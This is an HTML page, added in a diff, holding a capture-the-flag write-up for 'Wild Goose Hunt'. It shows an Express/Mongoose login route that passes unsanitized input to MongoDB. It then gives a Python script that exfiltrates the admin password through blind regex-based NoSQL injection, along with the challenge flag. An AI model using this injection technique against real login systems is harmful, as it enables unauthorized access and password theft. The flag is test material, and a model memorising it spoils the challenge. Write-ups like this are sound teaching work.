@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Wild Goose Hunt</title>
+    <link type="text/css" href="/css/markdown.css" rel="stylesheet">
+    <link type="text/css" href="/css/nav.css" rel="stylesheet">
+    <link rel="icon" href="/favicon.ico">
+</head>
+
+<body id="preview">
+    <div style="padding-bottom: 40px;">
+        <nav id="load-navbar"></nav>
+        <br />
+        <br />
+        <hr />    
+    </div>
+
+    <div id="tags">
+        <h5>Tags</h5>
+        <ul>
+            <li>express.js</li>
+            <li>mongodb</li>
+            <li>mongoose</li>
+            <li>nosql injection</li>
+            <li>regex</li>
+            <li>blind boolean-based exfiltration</li>
+        </ul>
+    </div>
+
+    <h1 class="code-line" data-line-start=0 data-line-end=1><a id="Wild_Goose_Hunt_0"></a>Wild Goose Hunt</h1>
+<h2 class="code-line" data-line-start=1 data-line-end=2><a id="Description_1"></a>Description</h2>
+<p class="has-line-data" data-line-start="2" data-line-end="3">Outdated Alien technology has been found by the human resistance. The system might contain sensitive information that could be of use to us. Our experts are trying to find a way into the system. Can you help?</p>
+<h2 class="code-line" data-line-start=4 data-line-end=5><a id="Files_4"></a>Files</h2>
+<p class="has-line-data" data-line-start="5" data-line-end="6">Provided docker environment.</p>
+<h2 class="code-line" data-line-start=7 data-line-end=8><a id="Code_7"></a>Code</h2>
+<h3 class="code-line" data-line-start=9 data-line-end=10><a id="entrypointsh_docker_initialization_file_9"></a><code>entrypoint.sh</code> (docker initialization file)</h3>
+<pre><code class="has-line-data" data-line-start="11" data-line-end="22" class="language-sh"><span class="hljs-shebang">#!/bin/ash
+</span>
+<span class="hljs-comment"># Secure entrypoint</span>
+chmod <span class="hljs-number">600</span> /entrypoint.sh
+mkdir /tmp/mongodb
+mongod --noauth --dbpath /tmp/mongodb/ &amp;
+sleep <span class="hljs-number">2</span>
+mongo heros --eval <span class="hljs-string">"db.createCollection('users')"</span>
+mongo heros --eval <span class="hljs-string">'db.users.insert( { username: "admin", password: "CHTB{f4k3_fl4g_f0r_t3st1ng}"} )'</span>
+/usr/bin/supervisord -c /etc/supervisord.conf
+</code></pre>
+<h3 class="code-line" data-line-start=23 data-line-end=24><a id="routesindexjs_23"></a><code>routes/index.js</code></h3>
+<pre><code class="has-line-data" data-line-start="25" data-line-end="53" class="language-js"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">'express'</span>);
+<span class="hljs-keyword">const</span> router  = express.Router();
+<span class="hljs-keyword">const</span> User    = <span class="hljs-built_in">require</span>(<span class="hljs-string">'../models/User'</span>);
+
+router.get(<span class="hljs-string">'/'</span>, (req, res) =&gt; {
+        <span class="hljs-keyword">return</span> res.render(<span class="hljs-string">'index'</span>);
+});
+
+router.post(<span class="hljs-string">'/api/login'</span>, (req, res) =&gt; {
+        <span class="hljs-keyword">let</span> { username, password } = req.body;
+
+        <span class="hljs-keyword">if</span> (username &amp;&amp; password) {
+                <span class="hljs-keyword">return</span> User.find({ 
+                        username,
+                        password
+                })
+                        .then((user) =&gt; {
+                                <span class="hljs-keyword">if</span> (user.length == <span class="hljs-number">1</span>) {
+                                        <span class="hljs-keyword">return</span> res.json({logged: <span class="hljs-number">1</span>, message: <span class="hljs-string">`Login Successful, welcome back <span class="hljs-subst">${user[0].username}</span>.`</span> });
+                                } <span class="hljs-keyword">else</span> {
+                                        <span class="hljs-keyword">return</span> res.json({logged: <span class="hljs-number">0</span>, message: <span class="hljs-string">'Login Failed'</span>});
+                                }
+                        })
+                        .catch(() =&gt; res.json({ message: <span class="hljs-string">'Something went wrong'</span>}));
+        }
+        <span class="hljs-keyword">return</span> res.json({ message: <span class="hljs-string">'Invalid username or password'</span>});
+});
+</code></pre>
+<h3 class="code-line" data-line-start=54 data-line-end=55><a id="modelsUserjs_54"></a><code>models/User.js</code></h3>
+<pre><code class="has-line-data" data-line-start="56" data-line-end="72" class="language-js"><span class="hljs-keyword">const</span> mongoose = <span class="hljs-built_in">require</span>(<span class="hljs-string">'mongoose'</span>);
+<span class="hljs-keyword">const</span> Schema   = mongoose.Schema;
+
+<span class="hljs-keyword">let</span> User = <span class="hljs-keyword">new</span> Schema({
+        username: {
+                type: <span class="hljs-built_in">String</span>
+        },
+        password: {
+                type: <span class="hljs-built_in">String</span>
+        }
+}, {
+        collection: <span class="hljs-string">'users'</span>
+});
+
+<span class="hljs-built_in">module</span>.exports = mongoose.model(<span class="hljs-string">'User'</span>, User);
+</code></pre>
+<h2 class="code-line" data-line-start=73 data-line-end=74><a id="Methodology_73"></a>Methodology</h2>
+<p class="has-line-data" data-line-start="74" data-line-end="75">We are using a <code>POST /api/login</code> request to fetch documents from <code>mongo</code> to login. We get a confirmation on successful or unsuccessful login. However <code>mongo</code> input is unsanitized, therefore we can use special <code>mongo</code> fetch constructs to get special results from the db. We will use <a href="https://docs.mongodb.com/manual/reference/operator/query/regex/">regex</a> for a blind boolean-based nosql. This way, we can exfiltrate the password one character at the time from the db.</p>
+<h2 class="code-line" data-line-start=76 data-line-end=77><a id="Exploit_76"></a>Exploit</h2>
+<pre><code class="has-line-data" data-line-start="78" data-line-end="99" class="language-python"><span class="hljs-comment">#!/usr/bin/python3</span>
+
+<span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> json
+<span class="hljs-keyword">import</span> string
+
+st = <span class="hljs-string">'_0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ}'</span>
+
+pas = <span class="hljs-string">'CHTB{'</span>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">64</span>):
+  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, len(st)-<span class="hljs-number">1</span>):
+    data = {<span class="hljs-string">'username'</span>: <span class="hljs-string">'admin'</span>, <span class="hljs-string">"password"</span>:{<span class="hljs-string">"$regex"</span>: <span class="hljs-string">"%(pass)s%(i)s.*"</span> % {<span class="hljs-string">"pass"</span>:pas, <span class="hljs-string">"i"</span>:st[i]}}}
+    r = requests.post(<span class="hljs-string">'http://138.68.148.149:30865/api/login'</span>, json=data)
+    c = r.content.decode()
+    j = json.loads(c)
+    
+    <span class="hljs-keyword">if</span> j[<span class="hljs-string">'logged'</span>] == <span class="hljs-number">1</span>:
+      pas += st[i]
+      print(pas)
+      <span class="hljs-keyword">break</span>
+</code></pre>
+<p class="has-line-data" data-line-start="100" data-line-end="101">Bruteforcing…</p>
+<p class="has-line-data" data-line-start="102" data-line-end="103"><img src="./brute.PNG" alt="brute"></p>
+<p class="has-line-data" data-line-start="104" data-line-end="105">Closing curly brace wasn’t detected, so we add it at the end.</p>
+<h2 class="code-line" data-line-start=106 data-line-end=107><a id="Flag_106"></a>Flag</h2>
+<p class="has-line-data" data-line-start="107" data-line-end="108"><strong>CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_b3f0r3}</strong></p>
+
+    <script src="/js/navbar.js"></script>
+</body>
+
+</html>
